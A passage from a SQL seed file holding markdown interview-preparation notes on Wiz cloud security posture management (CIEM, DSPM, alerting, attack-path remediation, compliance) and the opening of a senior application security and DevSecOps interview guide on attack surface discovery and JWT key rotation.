- Deploy a CloudFormation StackSet or Terraform module that creates a read-only IAM role in every account in the Organization
- The role has a trust policy allowing Wiz's external AWS account to assume it
- Permissions are read-only (SecurityAudit-level) plus snapshot permissions for workload scanning
- External ID is used in the trust policy for security

**Step 2: Initial Scan (hours, not days)**
- Wiz connects via the cross-account role and begins enumerating all resources via AWS APIs
- Asset inventory is populated: EC2, S3, IAM, VPC, RDS, Lambda, EKS, ECS, etc.
- Cloud configurations are evaluated against CSPM policies
- Disk snapshots are initiated for vulnerability scanning

**Step 3: Security Graph Population**
- As data flows in, the Security Graph builds relationships between entities
- Attack paths are computed
- Toxic combinations are identified

**Step 4: Compliance Mapping**
- Enable the relevant compliance frameworks for the organization
- Review initial compliance posture

**Step 5: Integration & Operationalization**
- Configure alert routing (Slack, Jira, ServiceNow, PagerDuty, SIEM)
- Set up remediation workflows
- Define SLA enforcement rules
- Assign ownership via tagging or business unit mapping
- Integrate with CI/CD for IaC scanning

**Key talking point:**
"I've onboarded entire AWS Organizations with 100+ accounts in under a day. The agentless model eliminates the months-long rollout you'd have with agent-based solutions, and the Security Graph immediately surfaces the highest-priority risks."

---

### Q9. How does Wiz identify and prioritize misconfigurations?

**Answer:**
Wiz uses a layered prioritization model that goes far beyond simple severity ratings:

**Layer 1: Configuration Assessment**
Wiz evaluates every resource against its configuration policies (equivalent to CIS benchmarks + Wiz's own research-driven rules). This produces raw findings like:
- S3 bucket has public ACL
- Security group allows SSH from 0.0.0.0/0
- RDS instance is not encrypted at rest
- IAM user has access keys older than 90 days

**Layer 2: Contextual Enrichment**
Each finding is enriched with context from the Security Graph:
- **Network Exposure:** Is this resource internet-facing? Behind a load balancer? In a private subnet?
- **Identity Context:** What IAM permissions does the associated role have? What can it access?
- **Data Sensitivity:** Does the resource contain or access sensitive data (from DSPM)?
- **Vulnerability Context:** Does the workload have known exploitable vulnerabilities?
- **Business Context:** Is this a production environment? What business unit owns it?

**Layer 3: Attack Path Analysis**
Findings that form part of an exploitable attack path are elevated. A public S3 bucket containing test data stays MEDIUM. A public S3 bucket accessible via an overly-permissive IAM role on an internet-facing, vulnerable VM becomes CRITICAL.

**Layer 4: Effective Severity Scoring**
The final severity considers:
- Base finding severity
- Attack path severity (CRITICAL if part of an active path to sensitive data)
- Business criticality (production vs development)
- Exploitability (is there a known exploit in the wild?)

---

### Q10. What is Wiz's approach to CIEM (Cloud Infrastructure Entitlement Management)?

**Answer:**
Wiz CIEM goes beyond simply listing IAM policies — it computes **effective permissions** by analyzing the full identity chain:

**What Wiz CIEM analyzes:**
1. **Effective Permissions:** Resolves the actual permissions an identity has after evaluating:
   - Attached managed policies
   - Inline policies
   - Group memberships
   - Permission boundaries
   - Service control policies (SCPs)
   - Resource-based policies
   - Session policies

2. **Transitive Access:** Maps multi-hop role assumption chains (Account A → Role B → Role C) to compute what an attacker could actually reach if they compromised a single identity

3. **Unused Privileges:** Analyzes CloudTrail to identify permissions that are granted but never used (e.g., a role has s3:* but only ever calls s3:GetObject on one bucket)

4. **Cross-Cloud Identities:** Tracks federated identities across AWS, Azure, and GCP to show the full blast radius

5. **Risk Indicators:**
   - Admin-equivalent permissions (any identity with iam:*, sts:*, or ability to escalate to admin)
   - Third-party cross-account access without ExternalID
   - Service accounts with console access enabled
   - Access keys older than 90 days

**How it integrates with CSPM:**
CIEM findings feed directly into the Security Graph. An overly-permissive IAM role alone is a MEDIUM CIEM finding. When connected to an internet-facing VM with a Critical CVE that accesses PII data in S3 — it becomes a CRITICAL attack path.

---

### Q11. Explain Wiz DSPM (Data Security Posture Management) and its importance.

**Answer:**
Wiz DSPM automatically discovers, classifies, and monitors sensitive data across cloud data stores:

**Discovery:**
- Scans S3 buckets, RDS databases, Azure Blob Storage, BigQuery datasets, Snowflake warehouses, etc.
- Uses agentless sampling — reads a statistically significant sample of data to classify without full data extraction

**Classification:**
- Identifies data types: PII (names, SSNs, emails), PHI (medical records), PCI (credit card numbers), financial data, credentials/secrets
- Uses pattern matching, ML-based classification, and pre-built data classifiers
- Results are tagged to the data store node in the Security Graph

**Why DSPM is critical for CSPM:**
Without DSPM, CSPM can tell you that an S3 bucket is public — but it can't tell you whether that matters. DSPM tells you "This public S3 bucket contains 250,000 customer credit card numbers." This transforms the CSPM finding from a compliance checkbox into an active data breach risk.

**Interview Talking Point:**
"DSPM is what turns a CSPM tool from a misconfiguration scanner into a business risk assessment tool. When the CISO asks 'What's our risk?', they don't want to hear 'We have 3,000 findings.' They want to hear 'We have 3 paths to our customer PII data, and here's how we close them.'"

---

# SECTION 3: WIZ OPERATIONS & ADMINISTRATION

---

### Q12. How do you manage alert fatigue in Wiz?

**Answer:**
Wiz's architecture inherently reduces alert fatigue through contextual prioritization, but operational governance is still essential:

**1. Leverage the Security Graph (Built-in Noise Reduction):**
- Wiz's attack path analysis naturally reduces noise by surfacing only the combinations that represent real risk
- Instead of 10,000 individual findings, you may have 50 attack paths — each a clear, actionable risk

**2. Alert Routing by Severity & Ownership:**
- **Critical Attack Paths:** → PagerDuty/Slack (immediate triage, 24h SLA)
- **High Findings:** → Jira ticket auto-created, assigned to owning team (48h SLA)
- **Medium Findings:** → Weekly governance report for team leads
- **Low Findings:** → Informational, reviewed monthly

**3. Automation Rules:**
- Auto-assign findings based on cloud tags (e.g., tag:team=payments → Jira project PAYMENTS)
- Auto-close findings when underlying resource is terminated
- Auto-suppress known-accepted risks with documented justification and expiry date

**4. Exception Management:**
- Approved exceptions with business justification, risk owner sign-off, and quarterly review
- Never permanent suppression — all exceptions expire and must be re-reviewed

**5. Governance Dashboards:**
- Track: Finding age, SLA compliance, team remediation velocity, top unremediated attack paths
- Report to CISO: "We have X Critical attack paths, Y are within SLA, Z need escalation"

---

### Q13. How would you integrate Wiz into a CI/CD pipeline for shift-left security?

**Answer:**

**Pre-Commit / IDE:**
- Wiz CLI scans IaC templates (Terraform, CloudFormation, Helm charts) locally before push
- Developer gets immediate feedback on misconfigurations

**CI Pipeline (Build Time):**
- Wiz IaC scanner runs as a pipeline step (GitHub Actions, GitLab CI, Jenkins)
- Scans Terraform plans, CloudFormation templates, Dockerfiles, Kubernetes manifests
- Pipeline fails on CRITICAL or HIGH severity misconfigurations
- Developer sees exactly which line in their Terraform has the issue

**Container Image Scanning:**
- After `docker build`, Wiz scans the image for vulnerabilities, malware, and misconfigurations
- Images with Critical CVEs are blocked from being pushed to the registry
- Image scan results are visible in Wiz alongside the running workload

**Post-Deploy (Runtime):**
- Wiz continuously monitors the deployed resources
- If drift occurs (someone manually changes a config that was correct in IaC), Wiz detects it and links back to the IaC commit

**Policy-as-Code:**
- Wiz policies can be defined in code and version-controlled
- Security team reviews and approves policy changes via PR process
- Same policies apply to both IaC scanning and runtime monitoring

**Example Pipeline Integration (GitHub Actions):**
```yaml
- name: Wiz IaC Scan
  uses: wiz-sec/iac-scan-action@v1
  with:
    wiz-client-id: ${{ secrets.WIZ_CLIENT_ID }}
    wiz-client-secret: ${{ secrets.WIZ_CLIENT_SECRET }}
    policy: "Default IaC Policy"
    fail-on-severity: "HIGH"
    path: "./terraform"
```

---

### Q14. Describe the Wiz Defend (CDR) capability and how it complements CSPM.

**Answer:**
Wiz Defend is the Cloud Detection & Response (CDR) layer that adds **runtime signal analysis** to Wiz's primarily posture-focused platform:

**Architecture:**
- Uses lightweight, optional eBPF-based sensors on cloud workloads
- Also correlates cloud control-plane signals (CloudTrail, Azure Activity Logs, GCP Audit Logs) without agents
- Integrates identity signals (unusual role assumptions, credential usage patterns)

**How it complements CSPM:**

| CSPM (Posture) | CDR / Wiz Defend (Runtime) |
|---|---|
| "This VM has a Critical CVE and is internet-facing" | "This VM is actively being exploited via that CVE right now" |
| "This IAM role is overly permissive" | "This IAM role's credentials are being used from an external IP" |
| "This S3 bucket is public" | "Someone is bulk-downloading data from this S3 bucket" |

**The CSPM + CDR Loop:**
1. CSPM identifies a risk **before** exploitation (proactive)
2. CDR detects the exploitation **in real-time** (reactive)
3. CSPM finding severity is elevated when CDR detects active exploitation of the same attack path
4. Automated response: CDR triggers containment (isolate instance, revoke credentials) while CSPM provides the remediation path to fix the root cause

---

### Q15. How does Wiz handle multi-cloud environments?

**Answer:**
Wiz's architecture is fundamentally multi-cloud — the Security Graph normalizes cloud resources across providers into a unified data model:

**Normalization Examples:**
- AWS EC2 Instance, Azure VM, GCP Compute Instance → all represented as "Virtual Machine" nodes
- AWS IAM Role, Azure Managed Identity, GCP Service Account → "Cloud Identity" nodes
- AWS S3, Azure Blob Storage, GCP Cloud Storage → "Object Storage" nodes
- AWS EKS, Azure AKS, GCP GKE → "Kubernetes Cluster" nodes

**Cross-Cloud Attack Paths:**
Wiz can identify attack paths that span clouds:
- A compromised AWS Lambda → assumes an IAM role → accesses a federated identity that has permissions in Azure Active Directory → accesses Azure Key Vault secrets

**Unified Policies:**
A single Wiz policy like "No public object storage buckets" automatically applies across AWS S3, Azure Blob, and GCP Cloud Storage — no need to write separate rules per cloud.

**Single Pane of Glass:**
One dashboard shows compliance posture, attack paths, and findings across all clouds — essential for organizations running hybrid or poly-cloud architectures.

---

# SECTION 4: SCENARIO-BASED QUESTIONS

---

### Q16. Scenario: You discover that a production EC2 instance appears in 3 different Critical attack paths in Wiz. How do you respond?

**Answer:**
**Immediate Assessment (First 30 minutes):**
1. Open the Wiz Security Graph and visualize all 3 attack paths to understand entry points, pivot points, and targets
2. Identify the common links — the EC2 instance is the hub. What makes it appear in 3 paths?
   - Is it internet-facing? (Network exposure)
   - Does it have an overly-permissive IAM role? (Identity risk)
   - Does it have Critical CVEs? (Vulnerability)
   - Does it access sensitive data? (Data exposure)

**Classification (30-60 minutes):**
3. Check Wiz Defend / CDR signals — is there any evidence of active exploitation? If yes, this is now an incident — trigger IR playbook
4. If no active exploitation, this is a Critical risk that needs immediate remediation

**Remediation Plan (Priority Order):**
5. **Break the paths:** Identify the single action that eliminates the most attack paths simultaneously:
   - Example: Restricting the IAM role from `s3:*` to specific bucket ARNs might break 2 of the 3 paths
6. **Harden the entry point:** If the instance is internet-facing, evaluate whether it needs to be or if it can be moved behind a load balancer / WAF
7. **Patch vulnerabilities:** Schedule patching for the Critical CVEs using the organization's emergency change process
8. **Verify:** After each remediation step, confirm in Wiz that the attack paths are resolved

**Communication:**
9. Brief the security team and instance owner on the risk and remediation timeline
10. Document the response for governance tracking

---

### Q17. Scenario: Your CISO asks you to prepare a compliance report for an upcoming PCI DSS audit using Wiz. Walk me through your process.

**Answer:**

**Phase 1: Framework Activation & Baseline (Week 1)**
1. Enable the PCI DSS v4.0 compliance framework in Wiz
2. Review the initial compliance dashboard — note the overall pass/fail percentage
3. Map Wiz's compliance findings to the specific PCI DSS requirements that are in scope (e.g., Requirement 1: Network Security Controls, Requirement 6: Secure Software Development, etc.)

**Phase 2: Gap Analysis (Week 1-2)**
4. Export the failing controls and categorize them:
   - **Quick Wins:** Can be remediated in < 1 day (e.g., enable encryption on an RDS instance)
   - **Engineering Work:** Requires code/architecture changes (e.g., network segmentation)
   - **Accepted Risks:** Business-justified exceptions with compensating controls documented
5. Create Jira tickets for each remediation item, auto-assigned via Wiz integration

**Phase 3: Remediation Sprint (Week 2-4)**
6. Work with engineering teams to remediate findings, prioritized by PCI requirement criticality
7. Track progress in Wiz's compliance dashboard — show improvement trends

**Phase 4: Audit Preparation (Week 4)**
8. Generate the Wiz PCI DSS compliance report — one-click export showing:
   - Control-by-control pass/fail status
   - Evidence of when controls were remediated
   - Remaining accepted risks with documented justification
9. Prepare a walkthrough for the auditor showing how Wiz continuously monitors PCI-related configurations

**Phase 5: Ongoing**
10. Set up automated alerts for any regression — if a PCI control starts failing again after remediation, the owning team is immediately notified

---

### Q18. Scenario: Wiz identifies an attack path where an internet-facing EKS pod with a Critical CVE can access an RDS database containing PII via an overly-permissive IRSA role. How do you remediate?

**Answer:**

**Attack Path Breakdown:**
```
Internet → EKS Pod (Critical CVE, public ingress) → IRSA Role (rds:*, s3:*) → RDS (PII data)
```

**Remediation Strategy — Break Each Link:**

**1. Identity (Most Impactful — Do First):**
- Restrict the IRSA role from `rds:*` to only the specific RDS cluster ARN the application needs
- Remove `s3:*` entirely if the pod doesn't need S3 access
- Add `aws:SourceVpc` condition to the IRSA trust policy to prevent external JWT abuse
- Review all IRSA roles in the cluster for similar over-permissiveness

**2. Vulnerability (Patch Immediately):**
- Identify the specific CVE — check if an exploit is available in the wild
- Update the container image to a patched version
- Run through CI/CD pipeline with Wiz image scanning to confirm the fix
- Redeploy the pod

**3. Network (Defense in Depth):**
- Review if the pod genuinely needs public internet exposure
- If yes, ensure it's behind an ALB/NLB with WAF and rate limiting
- If no, move the ingress to a private ingress controller
- Apply Kubernetes NetworkPolicy to restrict the pod's egress to only the RDS endpoint

**4. Data (Compensating Controls):**
- Ensure the RDS instance has audit logging enabled (log all queries against PII tables)
- Enable RDS encryption at rest and in transit
- Review RDS security group to ensure it only accepts connections from the EKS pod subnet

**5. Verification:**
- After all changes, re-check Wiz to confirm the attack path is eliminated
- Set up an alert if any component of this path reappears

---

### Q19. Scenario: A development team pushes back on a Wiz finding, claiming it's a false positive. How do you handle this?

**Answer:**

**Step 1: Investigate Before Responding**
- Review the finding in detail — look at the underlying resource configuration, the Security Graph context, and the attack path (if any)
- Don't dismiss the team's claim, but also don't accept it at face value

**Step 2: Evidence-Based Discussion**
- Pull the raw cloud configuration data that triggered the finding
- Compare it against the Wiz rule definition — is the rule accurately matching the configuration?
- If the team is correct (the rule doesn't apply to their specific use case):
  - Document the exception with business justification
  - Apply a scoped exception in Wiz (not a global rule change)
  - Set an expiry date for review
  - Ensure the team acknowledges residual risk

**Step 3: If the Finding is Valid but Low-Risk**
- Acknowledge the team's context (e.g., "Yes, this is a dev environment, but this same pattern would be Critical in production")
- Use it as a teaching moment — show the attack path that would exist if this config was in production
- Agree on remediation timeline appropriate to the environment

**Step 4: Process Improvement**
- If you keep getting the same "false positive" pushback, it may signal:
  - The rule needs a scope refinement (exclude dev accounts from production-grade rules)
  - The team needs training on security concepts
  - The rule is genuinely too noisy and should be tuned

**Key Principle:**
"I never suppress a finding without a documented justification, a risk owner, and an expiry date. Permanent suppressions are how organizations accumulate invisible risk."

---

### Q20. How would you use Wiz to investigate a potential data breach?

**Answer:**

**Initial Triage:**
1. Open the compromised resource in Wiz's Security Graph
2. Use the graph to map the **blast radius:**
   - What identities are associated with this resource?
   - What data stores can those identities access?
   - Are there cross-account or cross-cloud paths from this resource?

**DSPM Assessment:**
3. Check DSPM classifications for all data stores in the blast radius
   - Which stores contain PII, PHI, PCI data?
   - How many records are potentially exposed?
   - When was the data last accessed and by whom?

**Attack Path Reconstruction:**
4. Use Wiz's CSPM/CIEM data to reconstruct how the attacker could have reached the compromised resource:
   - Was there an internet-facing entry point?
   - Which misconfigurations enabled the path?
   - Were there any CSPM findings that predicted this path before the breach?

**Timeline Analysis:**
5. Correlate Wiz findings with cloud audit logs:
   - CloudTrail events for API calls from the compromised identity
   - VPC Flow Logs for network-level activity
   - Wiz Defend telemetry for runtime events

**Containment Guidance:**
6. Use Wiz's identity analysis to:
   - Identify all credentials that need rotation
   - Map all resources that need access revocation
   - Confirm containment is complete by verifying no remaining attack paths

---

# SECTION 5: WIZ AI-SPM & ADVANCED TOPICS

---

### Q21. What is Wiz AI-SPM (AI Security Posture Management)?

**Answer:**
AI-SPM is Wiz's capability to discover, assess, and secure AI workloads and ML pipelines:

**Discovery:**
- Identifies AI services: AWS SageMaker, Azure Machine Learning, GCP Vertex AI, Bedrock, OpenAI endpoints
- Detects "Shadow AI" — unauthorized or unmanaged AI workloads deployed by developers

**Risk Assessment:**
- **Model Security:** Are ML models stored in accessible locations? Are model artifacts encrypted?
- **Training Data Security:** Is training data properly classified and protected? Could it contain PII that would create compliance issues?
- **Endpoint Security:** Are inference endpoints publicly accessible without authentication?
- **Pipeline Security:** Are ML pipelines (training, deployment) secured with least-privilege IAM?

**Why it matters:**
"AI is the new S3 — teams are deploying SageMaker endpoints and Bedrock models without security review, just like they did with S3 buckets in 2017. AI-SPM ensures visibility and governance before Shadow AI becomes the next major attack surface."

---

### Q22. Compare Wiz's approach to Wiz Defend (CDR) vs. traditional SIEM-based detection.

**Answer:**

| Aspect | Traditional SIEM | Wiz Defend (CDR) |
|---|---|---|
| **Data Source** | Logs ingested from cloud (CloudTrail, VPC Flow Logs, K8s audit) | Cloud API signals + optional eBPF runtime telemetry + posture context |
| **Context** | Log events are evaluated in isolation — analyst must manually correlate | Events are automatically enriched with Security Graph context (what identity, what permissions, what data, what exposure) |
| **Detection Logic** | Rules/correlations written by security team based on log patterns | Graph-aware detections that understand the full attack path context |
| **Alert Quality** | Often noisy — high false positive rate without tuning | Contextual — a detection on a resource in a Critical attack path is prioritized differently than one on an isolated internal dev box |
| **Investigation** | Analyst pivots through multiple tools (SIEM → Cloud Console → IAM → network) | Single interface: detection event → resource → attack path → identity → data — all in the Security Graph |
| **Response** | Manual containment via separate tools or SOAR playbooks | Native automated containment (isolate instance, revoke credentials) within the Wiz platform |

**Key takeaway:**
"SIEM remains essential for log aggregation, compliance, and broad detection. Wiz Defend adds cloud-native, posture-aware detection that a SIEM cannot replicate — especially for understanding the business impact of a detection and automating cloud-specific containment."

---

### Q23. How does Wiz handle Kubernetes security specifically?

**Answer:**
Wiz provides comprehensive Kubernetes security across the entire lifecycle:

**Pre-Deployment:**
- IaC scanning of Helm charts, Kubernetes manifests, and Kustomize files in CI/CD
- Image scanning in container registries (ECR, ACR, GCR, Harbor)
- Policy-as-code for admission control (integrate with OPA/Gatekeeper)

**Runtime Posture (CSPM for K8s):**
- Connects to the Kubernetes API server to audit:
  - **RBAC:** Identifies overly-permissive ClusterRoleBindings, service accounts with cluster-admin access
  - **Pod Security:** Detects privileged containers, hostPID/hostNetwork/hostIPC, missing readOnlyRootFilesystem
  - **Network Policies:** Identifies namespaces without network policies, overly-permissive policies
  - **Secrets:** Detects secrets stored as environment variables instead of mounted secret volumes
  - **Image Compliance:** Identifies running containers from unscanned or unsigned images

**EKS/AKS/GKE Specific:**
- **EKS:** Checks aws-auth ConfigMap for dangerous mappings (system:masters), IRSA configurations, EKS cluster endpoint access settings, control plane logging
- **AKS:** Checks Azure RBAC integration, pod identity configurations, network security
- **GKE:** Checks Workload Identity, Binary Authorization, GKE Autopilot security settings

**Container Vulnerability Assessment:**
- Scans running container images for OS and language-level vulnerabilities
- Correlates vulnerabilities with the pod's network exposure, identity permissions, and data access to prioritize remediation

---

### Q24. What is the difference between Wiz Issues, Findings, and Attack Paths?

**Answer:**

| Concept | Definition | Example |
|---|---|---|
| **Finding** | A single security observation about a resource (misconfiguration, vulnerability, excessive permission) | "S3 bucket `customer-data` has public ACL enabled" |
| **Issue** | A Wiz-curated combination of findings that represents a notable risk. Issues are categorized by type (Misconfiguration, Vulnerability, Network Exposure, etc.) and severity. | "Public-facing VM with Critical CVE and admin-level IAM permissions" |
| **Attack Path** | A sequence of connected issues/findings in the Security Graph that shows how an attacker could move from an initial access point to a high-value target (sensitive data, admin access) | "Internet → Public VM (CVE-2024-1234) → Admin IAM Role → S3 Bucket (PII data)" |

**How they relate:**
- Many **Findings** feed into fewer **Issues** (contextual grouping)
- Issues are connected via the Security Graph to form **Attack Paths**
- Remediation is planned at the **Attack Path** level — fix the one link that breaks the most paths

---

### Q25. You're migrating from a legacy CSPM tool to Wiz. What's your approach?

**Answer:**

**Phase 1: Parallel Run (Weeks 1-4)**
1. Deploy Wiz alongside the existing tool — do not decommission yet
2. Onboard all cloud accounts to Wiz
3. Compare findings: map legacy tool's findings to Wiz's — identify gaps in both directions
4. Validate that all compliance frameworks the organization uses are available in Wiz

**Phase 2: Policy Alignment (Weeks 2-6)**
5. Review Wiz's default policies — enable/disable based on organizational relevance
6. Migrate any custom rules from the legacy tool to Wiz (using Wiz's custom policy framework)
7. Configure alert routing, Jira/ServiceNow integration, and notification channels
8. Test automated remediation workflows

**Phase 3: Operationalization (Weeks 4-8)**
9. Train security team and cloud engineering teams on Wiz console, Security Graph, and investigation workflows
10. Establish SLA enforcement rules and governance dashboards
11. Begin using Wiz as primary CSPM while maintaining legacy as read-only backup

**Phase 4: Decommission Legacy (Weeks 8-12)**
12. Confirm 100% coverage — all accounts, all resource types, all compliance frameworks
13. Decommission legacy tool after 2-week burn-in period with no issues
14. Document the migration for audit trail

**Key risk to address:**
"The biggest risk in migration is not the technology — it's the change management. Engineers are familiar with the old tool's workflows and may resist. I plan training sessions, create runbooks for common investigative workflows in Wiz, and appoint champions in each team."

---

# SECTION 6: COMPARISON & STRATEGIC QUESTIONS

---

### Q26. How would you explain the value of Wiz to a non-technical executive?

**Answer:**
"Think of our cloud environment as a building. Traditional security tools give us thousands of individual inspection reports — this lock is weak, that window is cracked, this fire alarm battery is low. Each report is accurate, but none of them tells us: 'Can a burglar actually get from the street to the vault?'

Wiz connects all of those individual findings into a map. It shows us: 'There are exactly 5 paths from the street to the vault — and here's the cheapest way to block each one.' We focus our limited engineering time on blocking those 5 paths instead of fixing 3,000 individual inspection findings.

The result: we reduce risk faster, with fewer resources, and I can show you a dashboard that says 'This week we went from 5 critical paths to 2' — not 'We fixed 200 findings but we don't know if we're actually safer.'"

---

### Q27. Wiz vs. CrowdStrike Falcon Cloud Security — how do they differ?

**Answer:**

| Aspect | Wiz | CrowdStrike Falcon Cloud Security |
|---|---|---|
| **Architecture** | Agentless-first (optional Wiz Defend sensors) | Agent-first (Falcon sensor DaemonSet) with agentless CSPM |
| **Strength** | Contextual risk prioritization, attack path analysis, Security Graph | Real-time runtime protection, eBPF-based process/syscall monitoring |
| **CSPM** | Industry-leading with graph-based prioritization | Solid but less graph-aware; more traditional finding-level alerts |
| **CWPP** | Agentless vulnerability scanning (no runtime kill/prevent capability without Defend) | Best-in-class runtime CWPP — detect and prevent container drift, binary execution, reverse shells |
| **CIEM** | Strong effective permissions analysis, transitive access mapping | Identity correlation with runtime telemetry — "this overly-permissive role was just used suspiciously" |
| **Container Security** | Registry scanning, K8s posture assessment, admission control integration | DaemonSet-based runtime container security, drift prevention in PREVENT mode, KAC admission controller |
| **Detection & Response** | Wiz Defend (newer, evolving) | Falcon Insight — mature, battle-tested XDR platform |
| **Ideal For** | Risk prioritization, posture management, compliance, board-level reporting | Runtime threat prevention, SOC operations, active breach response |

**Complementary Approach:**
"In an ideal architecture, Wiz provides the strategic risk layer (what should we fix to reduce our attack surface?) while CrowdStrike provides the tactical runtime layer (stop the attack that's happening right now). Many organizations run both."

---

### Q28. What are common pitfalls organizations face when implementing Wiz?

**Answer:**

1. **Alert Overload Without Process:**
   - Deploying Wiz across 200 accounts without establishing triage workflows → thousands of findings with no one to act on them
   - **Fix:** Start with top 10 Critical attack paths. Establish SLA-driven remediation process before expanding scope.

2. **Shadow IT Discovery Shock:**
   - Wiz discovers resources, accounts, and data stores the security team didn't know existed
   - **Fix:** Use this as a governance improvement opportunity. Establish asset ownership tagging and enforce via SCP.

3. **Over-Relying on Agentless:**
   - Assuming agentless = complete coverage. Without runtime sensors, you cannot detect active exploitation, container drift, or process-level attacks.
   - **Fix:** Deploy Wiz Defend sensors on high-value production workloads for runtime CDR.

4. **Compliance-Only Mindset:**
   - Using Wiz solely for CIS benchmark compliance and ignoring attack path analysis
   - **Fix:** Lead with attack paths for risk reduction, use compliance for regulatory requirements. Both are important but serve different purposes.

5. **No Developer Engagement:**
   - Security team uses Wiz as their private tool without integrating with development workflows
   - **Fix:** Integrate with CI/CD, Jira, Slack. Enable developer self-service remediation. Show developers their specific attack paths.

---

END OF WIZ INTERVIEW Q&A

---
*Prepared for Cloud Security Interview Preparation — March 2026*$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Application_Security_DevSecOps_Engineering_Interview_Guide$VELSEC$, $VELSEC$Application Security Devsecops Engineering Interview Guide$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['DevSecOps']::TEXT[], $VELSEC$# Senior Application Security & DevSecOps Engineering Interview Guide

**Target Audience:** Candidates with 8-10+ years of experience  
**Interview Duration:** 4-5 hours (multiple sessions)  
**Difficulty Level:** Advanced/Senior  
**Last Updated:** April 2026

---

## Table of Contents
1. [Core Application Security Concepts](#core-application-security-concepts)
2. [SAST/DAST/SCA Deep Dive](#sastdastsca-deep-dive)
3. [Threat Modeling & Risk Analysis](#threat-modeling--risk-analysis)
4. [DevSecOps Pipelines & CI/CD Security](#devsecops-pipelines--cicd-security)
5. [Cloud & Infrastructure Security](#cloud--infrastructure-security)
6. [Secure Coding & OWASP Top 10](#secure-coding--owasp-top-10)
7. [Scenario-Based Challenges](#scenario-based-challenges)
8. [Architecture Design Questions](#architecture-design-questions)
9. [Real-World Case Studies](#real-world-case-studies)
10. [Evaluation Framework](#evaluation-framework)

---

## SECTION 1: CORE APPLICATION SECURITY CONCEPTS

### Question 1.1: Advanced Attack Surface Management

**Question:**
> You're leading security for a microservices-based platform with 200+ services, external APIs, webhooks, and third-party integrations. How would you proactively discover, catalog, and continuously monitor the attack surface?

**Ideal Answer Structure:**

**1. Attack Surface Discovery Phase:**
- **Inventory Management:**
  - Automated service discovery using service mesh (Istio/Linkerd) or container registry scanning
  - Dynamic API catalog tools (Swagger/OpenAPI scanning, service introspection)
  - Dependency graph analysis to map implicit data flows and integrations
  - Shadow API detection using network traffic analysis
  - Integration with infrastructure-as-code (IaC) repositories for declarative endpoints

- **Validation Techniques:**
  - NMD (Network Mapping & Discovery) with tools like Shodan/ZoomEye for external exposure
  - Certificate transparency log monitoring for subdomain discovery
  - DNS fuzzing and OSINT techniques
  - BGP announcements monitoring

**2. Continuous Monitoring Strategy:**
- Real-time API schema changes triggering security baseline re-evaluation
- Network flow analysis to detect unauthorized communication paths
- Container image scanning for exposed ports/services
- Webhook endpoint verification and cryptographic signature validation

**3. Risk Prioritization:**
- Exposure scoring (internet-facing, authentication status, data sensitivity)
- Change impact analysis when new services deployed
- Dependency risk aggregation (transitive attack paths)

**4. Implementation Approach:**
```
Asset Inventory → Classification → Risk Scoring → Continuous Monitoring → Incident Response
        ↓               ↓               ↓                  ↓                    ↓
   Service Mesh    Data Types    Impact x     Automated Tests          Playbooks
   IaC Scanning   & Flows        Likelihood   Behavioral Checks        Remediation
   API Discovery  Segmentation   Exposure     Real-time Alerts         Patching
```

**Follow-up Cross Questions:**
1. How do you prevent "shadow APIs" created by developers outside your inventory system?
2. What's your approach when a third-party API changes authentication without notification?
3. How do you balance attack surface reduction (microservices isolation) with operational complexity?
4. Describe a scenario where attack surface discovery revealed a critical vulnerability.

**Common Mistakes:**
- ❌ Only documenting known APIs; missing undocumented or deprecated endpoints
- ❌ Point-in-time assessment instead of continuous monitoring
- ❌ Failing to include internal APIs and cross-service communication
- ❌ Not correlating attack surface with business impact classification
- ❌ Ignoring rate limiting, quotas, and resource constraints as part of surface complexity

**How Interviewer Evaluates:**
| Aspect | Strong Response | Weak Response |
|--------|-----------------|---------------|
| **Scope** | Mentions automated discovery + continuous monitoring | Lists only manual documentation |
| **Tooling** | References specific tools (Istio, API catalogs, scanning) | Vague references or no specifics |
| **Scalability** | Addresses challenge of 200+ services explicitly | Ignores scale implications |
| **Proactivity** | Shadow API/undocumented endpoint mitigation | Reactive after incidents |
| **Integration** | Links to IaC, CI/CD, security gates | Isolated security activity |

---

### Question 1.2: Authentication Token Management & Cryptographic Agility

**Question:**
> Your organization uses JWT tokens for API authentication. An algorithm vulnerability (e.g., RS256→RS/HS256 confusion or weak curves) is discovered in JOSE libraries. How would you rotate credentials, migrate token formats, and ensure zero downtime?

**Ideal Answer Structure:**

**1. Pre-Incident Preparation:**
- Multi-algorithm support during rotation window
- Token versioning strategy (issuer/version claims)
- Dual-signing capability (old + new keys simultaneously)
- Revocation mechanism (blacklist or short-lived tokens)

**2. Incident Response Steps:**
```
T+0h:   Vulnerability confirmed, rotation decision made
T+1h:   Deploy new key-signing service + algorithm v2
T+2h:   Enable dual-issuance (v1 + v2 tokens)
T+4h:   Begin client migration (gradual, version negotiation)
T+24h:  Deprecate v1 token validation (grace period)
T+48h:  Stop issuing v1 tokens
T+72h:  Complete revocation of v1 signing key
```

**3. Technical Implementation:**
```yaml
# Token format evolution
Old: {"alg":"RS256", "kid":"key-2024-v1"}
New: {"alg":"ES256", "kid":"key-2024-v2", "tkn_ver":2}

# Validation logic (backward compatible)
if token.alg in [RS256, ES256]:  # Accept during transition
    validate_sig(token, keys[token.kid])
    if token.tkn_ver == 1:
        log_deprecation_warning()
else:
    reject()  # Unknown algorithm

# API versioning support
GET /api/v1/users  (requires v1 or v2 tokens)
GET /api/v2/users  (requires v2+ tokens, stricter validation)
```

**4. Dependency Management:**
- Mobile app distribution (staggered rollout to guarantee update consumption)
- For backend services: immediate deployment + validation flexibility
- IoT/embedded devices: longer grace periods + fallback mechanisms
- Legacy clients: extended support windows or isolated legacy API tier

**5. Verification & Rollback:**
- Real-time monitoring of token validation failures
- Automatic rollback if error rate exceeds threshold
- Client-side error logs and diagnostic telemetry
- Traffic shape monitoring (detecting client failures)

**Follow-up Cross Questions:**
1. What if a mobile app can't be updated? How do you maintain security?
2. How do you detect if attackers have exploited the old algorithm before rotation?
3. Describe your monitoring for validation failures during rollout.
4. What's your approach if 5% of critical partners "forget" to update?
5. How does federated identity (OAuth2/OIDC) complicate this scenario?

**Common Mistakes:**
- ❌ Hard cutover without dual-issuance period (breaks clients)
- ❌ Not testing with all client types before rotation
- ❌ Missing the OAuth token endpoint + refresh token implications
- ❌ Not monitoring for sudden validation failures
